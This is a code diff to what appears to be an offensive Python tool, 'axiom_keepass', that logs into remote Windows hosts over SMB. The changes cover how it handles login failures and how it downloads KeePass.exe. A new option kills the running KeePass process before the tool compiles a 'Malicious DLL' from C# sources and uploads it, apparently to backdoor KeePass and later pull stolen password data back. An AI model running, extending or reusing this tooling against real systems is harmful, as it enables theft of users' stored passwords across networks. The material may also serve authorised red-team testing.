@@ -11,6 +11,7 @@ from axiom_keepass.client.login import login
 from axiom_keepass.client.download import download
 from axiom_keepass.client.upload import upload
 from axiom_keepass.client.pull import pull
+from axiom_keepass.utils.kill_process import kill_process
 
 class ThreadWorker(threading.Thread):
     def __init__(self, args, thread_index, thread_count, target_list, target_count):
@@ -35,32 +36,30 @@ class ThreadWorker(threading.Thread):
                     break
 
                 print(f"[THREAD {self.thread_index}][*] Processing target {self.target_list[current_index]}")
-                try:
-                    smbClient = login(self.args, self.target_list[current_index])
-                except Exception as e:
-                    print(f"[THREAD {self.thread_index}][!] {self.target_list[current_index]}: {str(e)}, adding to bad targets...")
+                smbClient = login(self.args, self.target_list[current_index], self.thread_index)
+                if smbClient is None:
                     bad_targets.append(self.target_list[current_index])
                     current_index += self.thread_count
                     continue
-                print(f"[THREAD {self.thread_index}][+] Successful login to {self.target_list[current_index]}")
 
                 if AxiomArgParser.GetProgramArgs().pull == True or AxiomArgParser.GetProgramArgs().monitor == True: # type: ignore
-                    print(f"[THREAD {self.thread_index}][*] Pulling from {self.target_list[current_index]}")
                     pull(smbClient, self.thread_index)
                     current_index += self.thread_count
                     continue
 
-                err = download(
+                if not download(
                     smbClient,
                     self.thread_index,
                     r"\Program Files\KeePass Password Safe 2\KeePass.exe",
                     f"{tmp_dir}/KeePass.exe",
                     silent=True
-                )
-                if err is None:
-                    print(f"[THREAD {self.thread_index}][+] Downloaded KeePass.exe from {self.target_list[current_index]}")
-                else:
-                    print(f"[THREAD {self.thread_index}][!] Failed to download KeePass from {self.target_list[current_index]}, is KeePass installed ?")
+                ):
+                    current_index += self.thread_count
+                    continue
+
+                if AxiomArgParser.GetProgramArgs().kill_first is True: #type: ignore
+                    kill_process(smbClient, self.thread_index, 'KeePass.exe')
+                    time.sleep(1)
 
                 subprocess.run([
                     "mcs",
@@ -72,7 +71,7 @@ class ThreadWorker(threading.Thread):
                     f"{os.path.dirname(__file__)}/../../Assembly/AxiomKeepass.cs",
                     f"{os.path.dirname(__file__)}/../../Assembly/AssemblyInfo.cs"
                 ])
-                print(f"[THREAD {self.thread_index}][+] Malicious dll compiled for {self.target_list[current_index]}")
+                print(f"[THREAD {self.thread_index}][+] Malicious DLL compiled for {self.target_list[current_index]}")
 
                 upload(
                     smbClient,
